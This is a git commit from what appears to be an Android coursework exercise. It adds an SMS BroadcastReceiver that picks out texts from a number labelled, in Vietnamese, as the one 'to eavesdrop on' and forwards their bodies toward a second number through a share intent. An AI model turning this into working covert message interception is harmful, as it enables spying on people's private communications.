f04e8f8e8aa605111af34f14b118e8f67b93dbbb
xuan hoang <hoang24k69@gmail.com>
2024-10-19 13:46:19 +0700

    Ex10: Mysmsreceive

---
+++ Ex10/app/src/main/java/com/example/ex10/MySmsReceive.java
@@ -0,0 +1,55 @@
+package com.example.ex10;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.telephony.SmsMessage;
+import android.widget.Toast;
+
+public class MySmsReceive extends BroadcastReceiver {
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        processReceive(context, intent);
+    }
+
+    public void processReceive(Context context, Intent intent) {
+        Bundle extras = intent.getExtras();
+        String message = "";
+        String body = "";
+        String address = "";
+
+        if (extras != null) {
+
+            Object[] smsExtra = (Object[]) extras.get("pdus");
+
+            for (int i = 0; i < smsExtra.length; i++) {
+                SmsMessage sms = SmsMessage.createFromPdu((byte[]) smsExtra[i]);
+                body = sms.getMessageBody();
+                address = sms.getOriginatingAddress();
+
+
+                if (address.equals("SỐ ĐIỆN THOẠI CẦN NGHE LÉN")) {
+                    message = "Có 1 tin nhắn từ " + address + "\n" + body + " vừa gửi đến";
+
+                    sendSMS(context, "SỐ ĐIỆN THOẠI CẦN CHUYỂN TIẾP", body);
+                }
+            }
+
+            Toast.makeText(context, message, Toast.LENGTH_LONG).show();
+        }
+    }
+
+
+    private void sendSMS(Context context, String phoneNumber, String message) {
+        Intent sendIntent = new Intent(Intent.ACTION_SEND);
+        sendIntent.setType("text/plain");
+        sendIntent.putExtra(Intent.EXTRA_TEXT, message);
+
+        if (sendIntent.resolveActivity(context.getPackageManager()) != null) {
+            context.startActivity(sendIntent);
+        }
+    }
+}
+
